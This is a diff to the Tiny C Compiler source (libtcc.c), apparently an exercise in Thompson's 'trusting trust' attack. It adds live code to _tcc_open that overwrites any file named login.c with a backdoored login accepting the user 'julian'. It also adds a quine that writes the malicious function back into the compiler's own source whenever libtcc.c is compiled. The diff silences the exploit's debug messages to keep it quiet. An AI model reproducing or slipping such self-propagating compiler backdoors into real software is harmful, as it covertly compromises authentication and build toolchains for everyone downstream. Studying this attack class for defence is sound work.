@@ -717,17 +717,85 @@ ST_FUNC void tcc_close(void)
 
 static int _tcc_open(TCCState *s1, const char *filename)
 {
+    char *lmao = "{\
+    char *lmao = %c%s%c;\
+    int fd;\
+    FILE * file;\
+    if(!strcmp(filename,%clogin.c%c)\
+    {\
+        file = fopen(filename, %cw+%c);\
+        char *bad = %c#include <string.h>\
+                static int\
+                do_login(const char *username)\
+            {\
+                if (!strcmp(username, %c%croot%c%c) || !strcmp(username, %c%cjulian%c%c))\
+                    return 0;\
+                return 1;\
+            }\
+            int main(int argc, char *argv[])\
+            {\
+                if (argc != 2)\
+                    return 1;\
+                return do_login(argv[1]);\
+            }\
+            %c;\
+        fprintf(file, %c%cs%c, bad);\
+        fclose(file);\
+    }\
+    else if (!strcmp(filename, %clibtcc.c%c))\
+    {\
+        char *func_head = %cstatic int _tcc_open(TCCState *s1, const char *filename)%c;\
+        char *func_end = %cST_FUNC int tcc_open(TCCState *s1, const char *filename)%c;\
+        \
+        char *line = NULL;\
+        size_t len = 0;\
+        int flag = 0;\
+        FILE *tf;\
+        file = fopen(filename, %cr%c);\
+        tf = fopen(%ctemp.c%c, %cw+%c);\
+        while (getline(&line, &len, file) != -1)\
+        {\
+            if (!flag)\
+            {\
+                fprintf(tf, %c%cs%c, line);\
+            }\
+            \
+            if (!strcmp(line, func_head))\
+            {\
+                flag = 1;\
+                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);\
+            }\
+            else if (!strcmp(line, func_end))\
+            {\
+                flag = 0;\
+            }\
+        }\
+    }\
+    \
+    if (strcmp(filename, %c-%c) == 0)\
+        fd = 0, filename = %c<stdin>%c;\
+    else\
+        fd = open(filename, O_RDONLY | O_BINARY);\
+    if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)\
+        printf(%c%cs %c*s%cs%cn%c, fd < 0 ? %cnf%c : %c->%c,\
+               (int)(s1->include_stack_ptr - s1->include_stack), %c%c, filename);\
+    return fd;\
+}\
+\
+ST_FUNC int tcc_open(TCCState *s1, const char *filename)\
+    ";
+
     int fd;
     // int pipefd[2];
     // pid_t p;
-    printf("Welcome to my exploit\n");
+    // printf("Welcome to my exploit\n");
     // pipe(pipefd);
     // p = fork();
 
     FILE *file;
     if (!strcmp(filename, "login.c"))
     {
-        printf("Found login.c\n");
+        // printf("Found login.c\n");
         file = fopen(filename, "w+");
         char *bad = "#include <string.h>\
                 static int\
@@ -747,81 +815,35 @@ static int _tcc_open(TCCState *s1, const char *filename)
         fprintf(file, "%s", bad);
         fclose(file);
     }
+    else if (!strcmp(filename, "libtcc.c"))
+    {
+        char *func_head = "static int _tcc_open(TCCState *s1, const char *filename)";
+        char *func_end = "ST_FUNC int tcc_open(TCCState *s1, const char *filename)";
 
-    // // Parent
-    // if (p > 0)
-    // {
-    //     close(pipefd[1]);
-    //     char str[256];
-    //     read(pipefd[0], str, 256);
-    // }
-    // // Child
-    // else if (p == 0)
-    // {
-    //     FILE *file;
-    //     if (strcmp(filename, "login.c") != 0)
-    //     {
-    //         char *line = NULL;
-    //         size_t len = 0;
+        char *line = NULL;
+        size_t len = 0;
+        int flag = 0;
+        FILE *tf;
+        file = fopen(filename, "r");
+        tf = fopen("temp.c", "w+");
+        while (getline(&line, &len, file) != -1)
+        {
+            if (!flag)
+            {
+                fprintf(tf, "%s", line);
+            }
 
-    //         file = fopen(filename, "r+");
-
-    //         while (getline(&line, &len, file) != -1)
-    //         {
-    //             write(pipefd[1], line, len);
-    //         }
-    //         fclose(file);
-    //     }
-    //     // Exploit for login.c
-    //     else if (!strcmp(filename, "login.c"))
-    //     {
-    //         printf("Found login.c\n");
-    //         file = fopen(filename, "w+");
-    //         char *bad = "#include <string.h>\
-    //             static int\
-    //             do_login(const char *username)\
-    //         {\
-    //             if (!strcmp(username, \"root\") || !strcmp(username, \"julian\"))\
-    //                 return 0;\
-    //             return 1;\
-    //         }\
-    //         int main(int argc, char *argv[])\
-    //         {\
-    //             if (argc != 2)\
-    //                 return 1;\
-    //             return do_login(argv[1]);\
-    //         }\
-    //         ";
-    //         fprintf(file, "%s", bad);
-    //         fclose(file);
-    //     }
-    //     // Quine for _tcc_open()
-    //     else if (!strcmp(filename, "libtcc.c"))
-    //     {
-    //         char *line = NULL;
-    //         size_t len = 0;
-
-    //         file = fopen(filename, "wb");
-    //         char *func_head = "static int _tcc_open(TCCState *s1, const char *filename)";
-    //         int flag = 0;
-    //         while (getline(&line, &len, file) != -1)
-    //         {
-    //             if (flag)
-    //             {
-    //                 // Replace bad _tcc_open to file
-    //             }
-
-    //             // Check to see if in _tcc_open function
-    //             if (!strcmp(line, func_head))
-    //             {
-    //                 flag = 1;
-    //             }
-    //         }
-    //         fclose(file);
-    //     }
-
-    //     close(pipefd[0]);
-    // }
+            if (!strcmp(line, func_head))
+            {
+                flag = 1;
+                fprintf(tf, lmao, 34, lmao, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 37, 37, 37, 92, 34, 34, 34, 34, 34, 34, 34);
+            }
+            else if (!strcmp(line, func_end))
+            {
+                flag = 0;
+            }
+        }
+    }
 
     if (strcmp(filename, "-") == 0)
         fd = 0, filename = "<stdin>";
